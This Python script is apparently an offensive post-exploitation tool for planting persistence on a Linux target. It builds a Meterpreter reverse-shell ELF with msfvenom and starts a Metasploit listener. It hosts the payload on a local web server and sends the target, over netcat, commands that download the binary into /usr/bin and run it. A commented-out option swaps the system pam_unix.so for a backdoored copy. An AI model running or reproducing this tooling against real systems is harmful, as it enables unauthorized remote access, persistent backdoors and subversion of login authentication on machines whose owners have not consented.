import argparse
import http.server
import multiprocessing
import os
import random
import requests
import socketserver
import string
import subprocess

__auth__ = 'Jayson Grace'

def __parse_args__():
    """Parse CLI arguments.
    """
    parser = argparse.ArgumentParser(description='Create web server, pull persistence payloads, and run them.')
    parser.add_argument('-l', '--lhost', help='Local IP Address', required=True)
    parser.add_argument('-r', '--rhost', help='Remote IP Address', required=True)
    return parser.parse_args()

def remove_file(file):
    if os.path.isfile(file):
        os.remove(file)
        print(f"{file} removed!")

def run_cmd(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    p_status = p.wait()
    return output

def id_generator(size=20, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def gen_elf(args):
    elf_file = f"{id_generator()}.elf"
    lhost = args.lhost
    lport = random.randint(9000,10000)
    run_cmd(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {elf_file}")
    print(f"Generated binary {elf_file} with LPORT {lport}")
    return elf_file, lport

def start_listener(rhost, lhost, lport):
    print(rhost)
    print(lhost)
    print(lport)
    run_cmd(f"gnome-terminal --tab --active -- bash -c 'msfconsole -r rogue_backdoor.rc {rhost} {lhost} {lport}; exec bash'")

# Modified from https://stackoverflow.com/questions/34932268/python-run-simplehttpserver-and-make-request-to-it-in-a-script
def start_webserver():
    web_lport = 8000
    url = f"localhost:{web_lport}"

    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", web_lport), handler)
    print(f"Web server starting on port {web_lport}")

    server_process = multiprocessing.Process(target=httpd.serve_forever)
    server_process.daemon = True
    server_process.start()

    return server_process

def create_nc_cmd_file(args, elf_file):
    run_cmd(f"echo 'wget {args.lhost}:8000/{elf_file} -O /usr/bin/{elf_file}' >> nc_commands.txt")
    run_cmd(f"echo 'chmod +x /usr/bin/{elf_file}' >> nc_commands.txt")
    run_cmd(f"echo '/usr/bin/{elf_file} &' >> nc_commands.txt")

def add_pam_to_nc_cmd(args):
    run_cmd(f"echo 'wget {args.lhost}:8000/post/pam_unix.so.backdoor -O /tmp/pam_unix.so.backdoor' >> nc_commands.txt")
    run_cmd("echo 'cp /lib/x86_64-linux-gnu/security/pam_unix.so /usr/share/pam/unix-auth' >> nc_commands.txt")
    run_cmd("echo 'chmod 644 /usr/share/pam/unix-auth' >> nc_commands.txt")
    run_cmd("echo 'cp /tmp/pam_unix.so.backdoor /lib/x86_64-linux-gnu/security/pam_unix.so' >> nc_commands.txt")

def get_shell(args):
	run_cmd(f"timeout 5 nc {args.rhost} 9999 < nc_commands.txt; echo exit=$?")

def cleanup():
    from pathlib import Path
    print('Cleaning up local elf files')
    for p in Path(".").glob("*.elf"):
        p.unlink()
    remove_file('nc_commands.txt')

def main():
    args = __parse_args__()
    remove_file('/root/.msf4/logs/rogue_backdoor-console.log')
    elf_file, lport = gen_elf(args)
    start_listener(args.rhost, args.lhost, lport)
    server_process = start_webserver()
    create_nc_cmd_file(args, elf_file)
    # ONLY UNCOMMENT THIS IF YOU KNOW WHAT YOU'RE DOING AND HAVE A WORKING PAM BACKDOOR TO USE
    #add_pam_to_nc_cmd(args)
    get_shell(args)
    print("Closing web server running on port 8000")
    server_process.terminate()
    cleanup()

if __name__ == '__main__':
    main()
